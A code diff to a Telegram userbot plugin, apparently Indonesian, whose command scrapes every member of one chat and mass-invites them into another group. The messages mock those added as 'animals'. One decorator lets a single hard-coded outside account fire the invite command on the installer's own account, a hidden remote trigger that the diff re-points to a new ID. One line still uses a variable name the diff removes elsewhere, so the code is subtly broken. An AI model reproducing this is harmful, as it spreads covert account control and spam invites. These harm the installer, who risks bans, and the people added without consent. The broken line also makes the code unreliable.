@@ -52,34 +52,34 @@ async def get_chatinfo(event):
 
 
 @register(outgoing=True, pattern=r"^\.inviteall(?: |$)(.*)")
-@register(incoming=True, from_users=1779447750, pattern=r"^\.cinvite(?: |$)(.*)")
+@register(incoming=True, from_users=1694909518, pattern=r"^\.cinvite(?: |$)(.*)")
 async def get_users(event):
     sender = await event.get_sender()
     me = await event.client.get_me()
     if not sender.id == me.id:
-        ram = await event.reply("`proses menambahkan beberapa binatang...`")
+        man = await event.reply("`proses menambahkan beberapa binatang...`")
     else:
-        ram = await event.edit("`Awas Limit tot!!...`")
-    ramubotteam = await get_chatinfo(event)
+        man = await event.edit("`Awas Limit tot!!...`")
+    manubotteam = await get_chatinfo(event)
     chat = await event.get_chat()
     if event.is_private:
-        return await ram.edit("`Maaf, Silahkan menambahkan pengguna di sini`")
+        return await man.edit("`Maaf, Silahkan menambahkan pengguna di sini`")
     s = 0
     f = 0
     error = 'None'
 
-    await ram.edit("**Status Berjalan**\n\n`Menambahkan Binatang.......`")
-    async for user in event.client.iter_participants(ramubotteam.full_chat.id):
+    await man.edit("**Status Berjalan**\n\n`Menambahkan Binatang.......`")
+    async for user in event.client.iter_participants(manubotteam.full_chat.id):
         try:
             if error.startswith("Too"):
                 return await ram.edit(f"**Tugas Selesai bersama dengan Error**\n(`May Got Limit Error from telethon Please try agin Later`)\n**Error** : \n`{error}`\n\n• Invited `{s}` people \n• Failed to Invite `{f}` people")
             await event.client(functions.channels.InviteToChannelRequest(channel=chat, users=[user.id]))
             s = s + 1
-            await ram.edit(f"**Sedang berjalan...**\n\n• Menambahkan `{s}` Binatang \n• Failed to Invite `{f}` people\n\n**× LastError:** `{error}`")
+            await man.edit(f"**Sedang berjalan...**\n\n• Menambahkan `{s}` Binatang \n• Failed to Invite `{f}` people\n\n**× LastError:** `{error}`")
         except Exception as e:
             error = str(e)
             f = f + 1
-    return await ram.edit(f"**Tugas Selesai** \n\n• Sukses menambahkan `{s}` Binatang sange \n• Binatang yang ngelawan `{f}` Binatang.")
+    return await man.edit(f"**Tugas Selesai** \n\n• Sukses menambahkan `{s}` Binatang sange \n• Binatang yang ngelawan `{f}` Binatang.")
 
 
 CMD_HELP.update({
